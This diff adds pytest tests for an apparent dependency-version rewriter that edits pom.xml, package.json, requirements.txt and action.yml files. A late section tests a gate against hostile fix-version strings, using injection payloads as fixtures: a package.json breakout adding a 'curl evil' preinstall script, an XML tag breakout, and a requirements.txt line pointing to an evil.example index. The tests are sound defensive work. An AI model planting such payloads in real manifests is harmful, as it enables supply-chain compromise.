+# pom.xml rewriter — robustness against pathological / oversized input
+# ---------------------------------------------------------------------------
+
+def _pom_plan(installed: str = "2.14.1",
+              target: str = "2.17.1") -> update._PlanEntry:
+    return update._PlanEntry(
+        ecosystem="Maven",
+        name="org.apache.logging.log4j:log4j-core",
+        installed=installed,
+        target=target,
+        manifest=Path("pom.xml"),
+        advisory_ids=["GHSA-x"],
+    )
+
+
+def test_pom_pathological_openers_completes_quickly() -> None:
+    """~1 MB of ``<dependency>`` openers with no closers. The old
+    tempered-dot DOTALL regex backtracked quadratically on this
+    shape (minutes of CPU); the find-based block scan must bail
+    out in linear time."""
+    import time
+
+    openers = "<dependency>" * 83_000        # ≈996 KB, under the size cap
+    start = time.monotonic()
+    text, applied, _reason = update._rewrite_pom_xml(openers, _pom_plan())
+    elapsed = time.monotonic() - start
+    assert applied is False
+    assert text == openers
+    assert elapsed < 10.0, f"pom scan took {elapsed:.1f}s on malformed input"
+
+
+def test_pom_over_size_cap_skipped_with_reason() -> None:
+    """Manifests past the size cap are skipped, never scanned."""
+    filler = "<dependency><groupId>g</groupId></dependency>"
+    big = filler * (update._POM_MAX_CHARS // len(filler) + 2)
+    assert len(big) > update._POM_MAX_CHARS
+    text, applied, reason = update._rewrite_pom_xml(big, _pom_plan())
+    assert applied is False
+    assert text == big
+    assert reason is not None and "exceeds" in reason
+
+
+def test_pom_block_scan_targets_matching_block_only() -> None:
+    """The linear scan must keep the old semantics: only the block
+    whose groupId+artifactId match is rewritten; same-version
+    entries in other block kinds stay untouched."""
+    pom = """\
+<project>
+  <build><plugins>
+    <plugin>
+      <groupId>other.group</groupId>
+      <artifactId>some-plugin</artifactId>
+      <version>2.14.1</version>
+    </plugin>
+  </plugins></build>
+  <dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+  </dependencies>
+</project>
+"""
+    text, applied, _reason = update._rewrite_pom_xml(pom, _pom_plan())
+    assert applied is True
+    assert "<artifactId>log4j-core</artifactId>" in text
+    assert text.count("<version>2.17.1</version>") == 1
+    assert "<artifactId>some-plugin</artifactId>" in text
+    # The plugin block keeps its old version.
+    plugin_block = text.split("<plugin>")[1].split("</plugin>")[0]
+    assert "<version>2.14.1</version>" in plugin_block
+
+
+def test_pom_duplicate_dependency_blocks_all_bumped() -> None:
+    """A pom legitimately declares the same groupId:artifactId in
+    several blocks (<dependencyManagement> + <dependencies>,
+    per-profile overrides). EVERY block still at the installed
+    version must be bumped — stopping at the first left the twin on
+    the vulnerable version while the run reported applied."""
+    pom = """\
+<project>
+  <dependencyManagement><dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+  </dependencies></dependencyManagement>
+  <dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+  </dependencies>
+</project>
+"""
+    text, applied, _reason = update._rewrite_pom_xml(pom, _pom_plan())
+    assert applied is True
+    assert text.count("<version>2.17.1</version>") == 2
+    assert "<version>2.14.1</version>" not in text
+
+
+def test_pom_property_ref_in_any_matching_block_refuses_all() -> None:
+    """When any matching block resolves its version via ``${...}``,
+    the whole edit is refused (original text back) regardless of
+    block order — rewriting only the literal twin while the property
+    decides the effective version elsewhere would half-edit the pom."""
+    pom = """\
+<project>
+  <dependencies>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>2.14.1</version>
+    </dependency>
+    <dependency>
+      <groupId>org.apache.logging.log4j</groupId>
+      <artifactId>log4j-core</artifactId>
+      <version>${log4j.version}</version>
+    </dependency>
+  </dependencies>
+</project>
+"""
+    text, applied, reason = update._rewrite_pom_xml(pom, _pom_plan())
+    assert applied is False
+    assert text == pom
+    assert reason is not None and "property reference" in reason
+
+
+def test_pom_target_written_verbatim() -> None:
+    """The replacement is a callable, not a template — backslash
+    sequences in the target version must land verbatim rather than
+    being reinterpreted as regex group references."""
+    pom = """\
+<project><dependencies><dependency>
+  <groupId>org.apache.logging.log4j</groupId>
+  <artifactId>log4j-core</artifactId>
+  <version>2.14.1</version>
+</dependency></dependencies></project>
+"""
+    plan = _pom_plan(target=r"2.17.1\g<1>")
+    text, applied, _reason = update._rewrite_pom_xml(pom, plan)
+    assert applied is True
+    assert r"<version>2.17.1\g<1></version>" in text
+
+
+# ---------------------------------------------------------------------------
+# package.json rewrites are anchored inside the dependency sections
+# ---------------------------------------------------------------------------
+
+def test_package_json_scripts_entry_does_not_shadow_dep(
+    tmp_path: Path,
+) -> None:
+    """A ``scripts`` entry named after the dep and appearing BEFORE the
+    dependency sections must neither be rewritten into a version string
+    nor consume the substitution slot: the real devDependencies pin is
+    bumped, the script command survives verbatim."""
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "name": "demo",
+        "scripts": {"jest": "jest --coverage"},
+        "devDependencies": {"jest": "26.6.3"},
+    }, indent=2), encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="npm", name="jest",
+        version="26.6.3", fixed_version="29.7.0",
+        manifest=pkg,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out),
+                 "--allow-major", "--offline"])
+    proposed = next(iter((out / "proposed").rglob("package.json")))
+    obj = json.loads(proposed.read_text())
+    assert obj["devDependencies"]["jest"] == "29.7.0"
+    assert obj["scripts"]["jest"] == "jest --coverage"
+
+
+def test_package_json_dep_only_in_scripts_is_skipped(
+    tmp_path: Path,
+) -> None:
+    """When the dep name only appears as a ``scripts`` key (no entry in
+    any dependency section), the rewrite is skipped — never applied
+    against the script command."""
+    pkg = tmp_path / "package.json"
+    original = json.dumps({
+        "name": "demo",
+        "scripts": {"eslint": "eslint src/"},
+        "dependencies": {"lodash": "4.17.21"},
+    }, indent=2)
+    pkg.write_text(original, encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="npm", name="eslint",
+        version="8.0.0", fixed_version="8.57.0",
+        manifest=pkg,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    changes = json.loads((out / "changes.json").read_text())
+    assert changes[0]["skipped_reason"] == "no matching spec found"
+    # Nothing materialised — the manifest was not touched at all.
+    assert not list((out / "proposed").rglob("package.json"))
+
+
+# ---------------------------------------------------------------------------
+# requirements.txt extras
+# ---------------------------------------------------------------------------
+
+def test_requirements_txt_extras_pin_rewritten(tmp_path: Path) -> None:
+    """``uvicorn[standard]==0.22.0`` — the new pin splices AFTER the
+    extras, replacing the old spec. Matching the bare name used to
+    emit ``uvicorn==0.30.0[standard]==0.22.0`` (invalid requirement,
+    vulnerable pin retained) while reporting applied."""
+    req = tmp_path / "requirements.txt"
+    req.write_text("uvicorn[standard]==0.22.0\nrequests==2.31.0\n",
+                   encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="PyPI", name="uvicorn",
+        version="0.22.0", fixed_version="0.30.0",
+        manifest=req,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out), "--offline"])
+    proposed = next(iter((out / "proposed").rglob("requirements.txt")))
+    body = proposed.read_text()
+    assert "uvicorn[standard]==0.30.0\n" in body
+    assert "0.22.0" not in body
+    assert "requests==2.31.0" in body
+
+
+# ---------------------------------------------------------------------------
+# Composite actions are an inline-install rewrite surface
+# ---------------------------------------------------------------------------
+
+def test_action_yml_recognised_as_inline_install_file(
+    tmp_path: Path,
+) -> None:
+    """``action.yml`` (composite action) carries the same ``run:``
+    install lines as workflows; discovery and the parser both treat it
+    as an inline-install source, so the rewriter must too — otherwise
+    deps parsed from composite actions can never be rewritten."""
+    from packages.sca.update import (
+        _is_inline_install_file,
+        _PlanEntry,
+        _rewrite_one,
+    )
+    for name in ("action.yml", "action.yaml"):
+        assert _is_inline_install_file(Path(name)) is True
+    # Agrees with the discovery predicate.
+    from packages.sca.discovery import _is_inline_install_source
+    for name in ("action.yml", "action.yaml"):
+        assert _is_inline_install_source(Path(name)) is True
+
+    action = tmp_path / "action.yml"
+    text = ("runs:\n  using: composite\n  steps:\n"
+            "    - run: pip install semgrep==1.0.0\n")
+    plan = _PlanEntry(
+        ecosystem="PyPI", name="semgrep", installed="1.0.0",
+        target="1.5.0", manifest=action, advisory_ids=[],
+    )
+    new_text, applied, reason = _rewrite_one(action, text, plan)
+    assert applied is True, reason
+    assert "semgrep==1.5.0" in new_text
+
+
+def test_package_json_nested_decoy_section_not_consumed(
+    tmp_path: Path,
+) -> None:
+    """A ``dependencies`` object NESTED inside another section (the
+    manifest is attacker-authored) must not consume the substitution:
+    only the root-level section is a dependency section, so the real
+    top-level pin is bumped and the decoy stays untouched."""
+    pkg = tmp_path / "package.json"
+    pkg.write_text(json.dumps({
+        "name": "demo",
+        "scripts": {"dependencies": {"lodash": "4.17.4"}},
+        "dependencies": {"lodash": "4.17.4"},
+    }, indent=2), encoding="utf-8")
+    findings = _findings_file(tmp_path, [_vuln_row(
+        ecosystem="npm", name="lodash",
+        version="4.17.4", fixed_version="4.17.21",
+        manifest=pkg,
+    )])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out),
+                 "--offline"])
+    proposed = next(iter((out / "proposed").rglob("package.json")))
+    obj = json.loads(proposed.read_text())
+    assert obj["dependencies"]["lodash"] == "4.17.21"
+    assert obj["scripts"]["dependencies"]["lodash"] == "4.17.4"
+
+
+def test_package_json_decoy_only_is_clean_skip(tmp_path: Path) -> None:
+    """When the dep exists ONLY inside a nested decoy section, the
+    rewrite is refused — never applied against the decoy."""
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "config": {"devDependencies": {"lodash": "4.17.4"}},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[])
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason == "no matching spec found"
+
+
+def test_requirements_txt_spaced_extras_and_operator_rewritten(
+    tmp_path: Path,
+) -> None:
+    """PEP 508 allows whitespace before the extras bracket and around
+    the operator (``uvicorn [standard] == 0.22.0``) — the parser emits
+    an exact-pinned dep for it, so the rewriter must consume the WHOLE
+    spaced form. A name-only match used to splice the pin mid-line
+    (``uvicorn==0.30.0[standard] == 0.22.0``: invalid, vulnerable pin
+    retained, reported applied)."""
+    req = tmp_path / "requirements.txt"
+    req.write_text(
+        "uvicorn [standard] == 0.22.0\n"
+        'flask == 2.3.0 ; python_version >= "3.8"\n',
+        encoding="utf-8",
+    )
+    findings = _findings_file(tmp_path, [
+        _vuln_row(ecosystem="PyPI", name="uvicorn",
+                  version="0.22.0", fixed_version="0.30.0",
+                  manifest=req),
+        _vuln_row(ecosystem="PyPI", name="flask",
+                  version="2.3.0", fixed_version="2.3.3",
+                  manifest=req),
+    ])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out),
+                 "--offline"])
+    proposed = next(iter((out / "proposed").rglob("requirements.txt")))
+    body = proposed.read_text()
+    assert "uvicorn [standard]==0.30.0\n" in body
+    assert "0.22.0" not in body
+    # Spaced operator + trailing environment marker both survive.
+    assert 'flask==2.3.3 ; python_version >= "3.8"' in body
+    assert "2.3.0" not in body
+
+
+# ---------------------------------------------------------------------------
+# npm-alias fix-materialisation — the rewrite anchors on the ALIAS key
+# and writes the ``npm:<real>@…`` spelling back
+# ---------------------------------------------------------------------------
+
+def test_bump_npm_spec_alias_preserves_alias_spelling() -> None:
+    assert update._bump_npm_spec(
+        "npm:lodash@^4.17.0", "4.17.4", "4.17.21",
+    ) == "npm:lodash@^4.17.21"
+    assert update._bump_npm_spec(
+        "npm:@scope/real@~1.2.0", "1.2.1", "1.2.3",
+    ) == "npm:@scope/real@~1.2.3"
+    # No range after the target → pin the target version.
+    assert update._bump_npm_spec(
+        "npm:lodash", "4.17.4", "4.17.21",
+    ) == "npm:lodash@4.17.21"
+    # Bare protocol form (range, no package name) → manual review.
+    assert update._bump_npm_spec("npm:^1.0.0", "1.0.1", "1.0.5") is None
+
+
+def test_rewrite_package_json_aliased_dep(tmp_path: Path) -> None:
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"my-lodash": "npm:lodash@^4.17.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    # The alias key and the npm:<real>@ spelling both survive.
+    assert '"my-lodash": "npm:lodash@^4.17.21"' in new_text
+    assert "4.17.0" not in new_text
+
+
+def test_rewrite_package_json_alias_plan_falls_back_to_plain_key(
+    tmp_path: Path,
+) -> None:
+    # The plan carries an alias but this manifest declares the package
+    # un-aliased (both spellings exist in the project) — the plain key
+    # still rewrites.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"lodash": "^4.17.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    assert '"lodash": "^4.17.21"' in new_text
+
+
+def test_update_main_materialises_alias_rewrite(tmp_path: Path) -> None:
+    manifest = tmp_path / "package.json"
+    manifest.write_text(json.dumps({
+        "dependencies": {"my-lodash": "npm:lodash@^4.17.0"},
+    }, indent=2), encoding="utf-8")
+    findings = _findings_file(tmp_path, [
+        _vuln_row(ecosystem="npm", name="lodash",
+                  version="4.17.4", fixed_version="4.17.21",
+                  manifest=manifest, alias_name="my-lodash"),
+    ])
+    out = tmp_path / "out"
+    update.main(["--findings", str(findings), "--out", str(out),
+                 "--offline"])
+    proposed = next(iter((out / "proposed").rglob("package.json")))
+    body = proposed.read_text()
+    assert '"my-lodash": "npm:lodash@^4.17.21"' in body
+    assert "4.17.0" not in body
+    # The installed package's name never appears as a manifest key.
+    assert '"lodash":' not in body
+
+
+def test_rewrite_package_json_alias_and_plain_both_bumped(
+    tmp_path: Path,
+) -> None:
+    # One manifest declares the package BOTH aliased and plain — the
+    # single plan (keyed on the installed package) must fix both
+    # spellings, or one declaration stays on the vulnerable range
+    # while the change reports applied.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {
+            "my-lodash": "npm:lodash@^4.17.0",
+            "lodash": "^4.17.0",
+        },
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    obj = json.loads(new_text)
+    assert obj["dependencies"]["my-lodash"] == "npm:lodash@^4.17.21"
+    assert obj["dependencies"]["lodash"] == "^4.17.21"
+
+
+def test_rewrite_package_json_never_writes_into_a_different_alias_target(
+    tmp_path: Path,
+) -> None:
+    # A key equal to plan.name that aliases a DIFFERENT package
+    # ("lodash": "npm:left-pad@^1") must never receive the plan's fix
+    # version — and the genuinely vulnerable plain declaration in the
+    # other section must still be found and bumped.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"lodash": "npm:left-pad@^1.0.0"},
+        "devDependencies": {"lodash": "^4.17.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[])
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is True, reason
+    obj = json.loads(new_text)
+    assert obj["dependencies"]["lodash"] == "npm:left-pad@^1.0.0"
+    assert obj["devDependencies"]["lodash"] == "^4.17.21"
+
+
+def test_rewrite_package_json_alias_key_with_plain_spec_not_touched(
+    tmp_path: Path,
+) -> None:
+    # The plan's alias spelling collides with a REAL package of that
+    # name declared plainly — that's a different dep, not an aliased
+    # install of the plan's package.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"my-lodash": "^1.0.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="lodash",
+                      installed="4.17.4", target="4.17.21",
+                      manifest=Path("package.json"), advisory_ids=[],
+                      alias_name="my-lodash")
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason == "no matching spec found"
+
+
+def test_rewrite_package_json_case_sibling_alias_not_bumped(
+    tmp_path: Path,
+) -> None:
+    # Legacy case-colliding npm names are distinct packages
+    # (JSONStream vs jsonstream) — a plan for the lowercase one must
+    # not write into an alias targeting its case-sibling.
+    from packages.sca.update import _PlanEntry, _rewrite_package_json
+    text = json.dumps({
+        "dependencies": {"jsonstream": "npm:JSONStream@^1.0.0"},
+    }, indent=2)
+    plan = _PlanEntry(ecosystem="npm", name="jsonstream",
+                      installed="1.0.0", target="1.3.5",
+                      manifest=Path("package.json"), advisory_ids=[])
+    new_text, applied, reason = _rewrite_package_json(text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason == "no matching spec found"
+
+
+# ---------------------------------------------------------------------------
+# Untrusted fix-version grammar gate — local-rewriter chokepoint
+# ---------------------------------------------------------------------------
+
+def _hostile_plan(manifest: str, ecosystem: str, name: str,
+                  installed: str, target: str) -> update._PlanEntry:
+    return update._PlanEntry(
+        ecosystem=ecosystem, name=name, installed=installed,
+        target=target, manifest=Path(manifest), advisory_ids=["GHSA-x"],
+    )
+
+
+def test_hostile_target_refused_for_package_json() -> None:
+    """A fixed_version carrying a JSON-string breakout must never be
+    spliced between package.json quotes (install-script injection)."""
+    payload = '4.17.21", "scripts": {"preinstall": "curl evil"'
+    text = json.dumps({"dependencies": {"lodash": "^4.17.19"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "lodash",
+                         "4.17.19", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("package.json"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "preinstall" not in new_text
+    assert reason is not None and reason.startswith("refused")
+    # The refusal reason is rendered into operator markdown/stdout —
+    # it must carry no raw newline or unescaped backtick/pipe.
+    assert "\n" not in reason
+
+
+def test_hostile_target_refused_for_pom_xml() -> None:
+    payload = "2.17.1</version></dependency><dependency>evil"
+    text = (
+        "<project><dependencies><dependency>"
+        "<groupId>org.apache.logging.log4j</groupId>"
+        "<artifactId>log4j-core</artifactId>"
+        "<version>2.14.1</version>"
+        "</dependency></dependencies></project>"
+    )
+    plan = _hostile_plan(
+        "pom.xml", "Maven", "org.apache.logging.log4j:log4j-core",
+        "2.14.1", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("pom.xml"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "</version></dependency>" not in payload or "evil" not in new_text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_hostile_target_refused_for_requirements_txt() -> None:
+    payload = "2.28.0\n--extra-index-url https://evil.example/simple"
+    text = "requests==2.27.0\n"
+    plan = _hostile_plan("requirements.txt", "PyPI", "requests",
+                         "2.27.0", payload)
+    new_text, applied, reason = update._rewrite_one(
+        Path("requirements.txt"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert "--extra-index-url" not in new_text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_plain_version_targets_still_rewrite() -> None:
+    """Positive direction: the gate admits ordinary version literals
+    (including build metadata / pre-release shapes)."""
+    text = json.dumps({"dependencies": {"lodash": "^4.17.19"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "lodash",
+                         "4.17.19", "4.17.21")
+    new_text, applied, reason = update._rewrite_one(
+        Path("package.json"), text, plan)
+    assert applied is True and "^4.17.21" in new_text
+    req = "requests==2.27.0\n"
+    plan2 = _hostile_plan("requirements.txt", "PyPI", "requests",
+                          "2.27.0", "2.28.0rc1")
+    new_req, applied2, _ = update._rewrite_one(
+        Path("requirements.txt"), req, plan2)
+    assert applied2 is True and "2.28.0rc1" in new_req
+
+
+def test_optimise_bare_pin_refuses_hostile_target() -> None:
+    """The bare-name pin fallback is the one rewrite entry point not
+    routed through _rewrite_one — it must apply the same gate (it runs
+    exactly when _rewrite_one declined, including gate declines)."""
+    from packages.sca import optimise
+    payload = '1.0.0", "scripts": {"preinstall": "curl evil"'
+    text = json.dumps({"dependencies": {"left-pad": "*"}}, indent=2)
+    plan = _hostile_plan("package.json", "npm", "left-pad",
+                         "1.0.0", payload)
+    new_text, applied, reason = optimise._pin_bare_name(
+        Path("package.json"), text, plan)
+    assert applied is False
+    assert new_text == text
+    assert reason is not None and reason.startswith("refused")
+
+
+def test_dpkg_epoch_and_tilde_targets_pass_gate() -> None:
+    """Debian epoch (``4:12.2.0-3``) and tilde (``1.0~rc1``) versions
+    are legitimate upgrade targets — the gate must admit them while
+    still refusing splice shapes that merely CONTAIN a colon."""
+    plan = _hostile_plan("requirements.txt", "Debian", "nginx",
+                         "1.22.1-9", "4:12.2.0-3")
+    assert update.refuse_unsafe_target(plan) is None
+    plan_tilde = _hostile_plan("requirements.txt", "Debian", "nginx",
+                               "1.22.1-9", "1.0~rc1+deb12u1")
+    assert update.refuse_unsafe_target(plan_tilde) is None
+    for bad in ('4:12","scripts":{}', "4:12\n--evil", "4:12 <x>", ":leading"):
+        p = _hostile_plan("requirements.txt", "Debian", "nginx",
+                          "1.22.1-9", bad)
+        assert update.refuse_unsafe_target(p) is not None
+
+
+def test_change_key_folds_case_only_where_the_registry_does() -> None:
+    """PyPI names are case-insensitive (PEP 503) so folding is
+    correct there; npm names are case-SENSITIVE, and lowercasing made
+    case-distinct packages share one compat report — the package.json
+    rewriter explicitly refuses that conflation."""
+    from packages.sca.update import UpgradeChange, _change_key
+
+    def _chg(eco: str, name: str) -> UpgradeChange:
+        return UpgradeChange(
+            ecosystem=eco, name=name, manifest=Path("/m"),
+            old_version="1.0", new_version="2.0",
+            advisory_ids=("GHSA-x",),
+        )
+
+    assert (_change_key(_chg("npm", "JSONStream"))
+            != _change_key(_chg("npm", "jsonstream")))
+    assert (_change_key(_chg("PyPI", "Django"))
+            == _change_key(_chg("PyPI", "django")))
